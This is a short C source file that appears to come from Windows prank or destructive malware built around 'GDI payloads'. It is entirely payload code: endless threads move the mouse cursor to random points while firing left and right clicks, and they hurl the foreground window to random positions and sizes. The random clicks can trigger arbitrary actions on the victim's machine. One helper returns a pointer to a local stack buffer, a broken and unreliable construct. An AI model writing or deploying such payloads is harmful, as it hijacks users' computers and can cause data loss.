#include "haste.h"

LPCWSTR GetRandomizedPath(VOID) {
	WCHAR wcDirectory[MAX_PATH];
	GetModuleFileNameW(NULL, (WCHAR*)wcDirectory, MAX_PATH);
	return (LPCWSTR)wcDirectory;
}

VOID WINAPI EndGdiPayload(HANDLE hGdiPayload, HANDLE hHeapGdiPayload) {
	TerminateThread(hGdiPayload, NULL);
	CloseHandle(hGdiPayload);
	HeapDestroy(hHeapGdiPayload);
}

DWORD WINAPI CursorMoveThread(LPVOID lpCursorThread) {
	CONST INT screenWidth = GetSystemMetrics(SM_CXSCREEN);
	CONST INT screenHeight = GetSystemMetrics(SM_CYSCREEN);
	while (TRUE) {
		INT nX = rand() % screenWidth;
		INT nY = rand() % screenHeight;
		SetCursorPos(nX, nY);
		mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
		mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
		Sleep(rand() % 1000);
	}
	return 0x00;
}

DWORD WINAPI MoveWindowThread(LPVOID lpWindowThread) {
	CONST INT screenWidth = GetSystemMetrics(SM_CXSCREEN);
	CONST INT screenHeight = GetSystemMetrics(SM_CYSCREEN);
	while (TRUE) {
		HWND hWindow = GetForegroundWindow();
		MoveWindow(hWindow, rand() % screenWidth, rand() % screenHeight, rand() % screenWidth, rand() % screenHeight, FALSE);
		Sleep(rand() % 1000);
	}
	return 0x00;
}